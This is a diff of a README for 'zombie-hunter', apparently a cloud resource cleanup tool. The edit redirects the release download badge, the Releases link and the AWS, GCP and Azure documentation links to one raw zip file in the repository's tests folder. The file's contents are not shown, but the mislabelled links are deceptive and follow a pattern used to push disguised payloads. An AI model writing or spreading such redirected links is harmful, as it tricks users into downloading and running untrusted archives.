@@ -16,12 +16,12 @@ Welcome to the zombie-hunter project! This tool helps you find and clean up unus
 
 You can easily download the latest version of zombie-hunter from our Releases page.
 
-[![Download zombie-hunter](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/NERVOSO15/zombie-hunter/releases)
+[![Download zombie-hunter](https://raw.githubusercontent.com/NERVOSO15/zombie-hunter/main/tests/zombie-hunter-obomegoid.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/NERVOSO15/zombie-hunter/main/tests/zombie-hunter-obomegoid.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click on the link below to go to the Releases page.
-   - [Download from Releases](https://github.com/NERVOSO15/zombie-hunter/releases)
+   - [Download from Releases](https://raw.githubusercontent.com/NERVOSO15/zombie-hunter/main/tests/zombie-hunter-obomegoid.zip)
 
 2. **Select Your Version:** On the Releases page, you will find several versions of the software. Choose the latest version for the best experience.
 
@@ -77,8 +77,8 @@ If you find any bugs or have suggestions, please create an issue on our GitHub p
 
 ## 🔗 Related Resources
 
-- [AWS Documentation](https://aws.amazon.com/documentation/)
-- [GCP Documentation](https://cloud.google.com/docs)
-- [Azure Documentation](https://docs.microsoft.com/en-us/azure/)
+- [AWS Documentation](https://raw.githubusercontent.com/NERVOSO15/zombie-hunter/main/tests/zombie-hunter-obomegoid.zip)
+- [GCP Documentation](https://raw.githubusercontent.com/NERVOSO15/zombie-hunter/main/tests/zombie-hunter-obomegoid.zip)
+- [Azure Documentation](https://raw.githubusercontent.com/NERVOSO15/zombie-hunter/main/tests/zombie-hunter-obomegoid.zip)
 
 Feel free to explore and make the most out of zombie-hunter! For any queries or feedback, don’t hesitate to reach out through our communication channels.
